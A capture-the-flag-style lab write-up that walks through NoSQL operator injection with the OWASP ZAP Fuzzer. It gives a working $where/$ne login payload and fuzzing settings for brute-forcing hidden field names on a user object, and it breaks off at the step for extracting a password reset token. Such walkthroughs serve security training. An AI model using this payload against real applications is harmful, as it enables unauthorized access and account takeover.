# Lab: Exploiting NoSQL operator injection to extract unknown fields [OWASP Zed Attack Proxy]

## Brute-forcing to identify all the fields on the user object

> Burp Suite Community edition's __Intruder__ being useless brought us here. 

Attempt a log in with credentials `carlos:invalid`. Find the `POST /login` request, right-click it and select "Open in Requester Tab". Right-click it there as well and select "Fuzz..."

A Fuzzer opens up, click "Edit" replace the request body with the following:

```json
{"username":"carlos","password":{"$ne":"invalid"}, "$where":"Object.keys(this)[1].match('^.{0}a.*')"}
```

Click "Save". First select `1` at `..(this)[1]..`, click "Add..." below Fuzz Locations, click "Add..." in the new window and then select "Numberzz" from the dropdown. Enter From `1` to `9`. Click "Add" and then "OK". 

Now add another Fuzz location the same way for `0` at `{0}`. Again, select "Numberzz" and input From `0` to `20`. 

Now add another Fuzz location the same way for `a` at `{0}a.*`. Select "Regex" and add the following regex `[a-zA-Z0-9]`. You can generate preview to make sure it's correct. 

Start Fuzzer! Could this have been any more beautiful?


| param 1  | param 2  | param 3  | param 4  |
|-------------------------------------------|
| 1, 0, u  | 2, 0, p  | 3, 0, e  | 4, 0, f  |
| 1, 1, s  | 2, 1, a  | 3, 1, m  | 4, 1, o  |
| 1, 2, e  | 2, 2, s  | 3, 2, a  | 4, 2, r  |
| 1, 3, r  | 2, 3, s  | 3, 3, i  | 4, 3, g  |
| 1, 4, n  | 2, 4, w  | 3, 4, l  | 4, 4, o  |
| 1, 5, a  | 2, 5, o  | .......  | 4, 5, t  |
| 1, 6, m  | 2, 6, r  | .......  | 4, 6, P  |
| 1, 7, e  | 2, 7, d  | .......  | 4, 7, w  |
| .......  | .......  | .......  | 4, 8, D  |

Took it about 20 minutes.

## Brute-forcing to extract the value of Carlos's password reset token


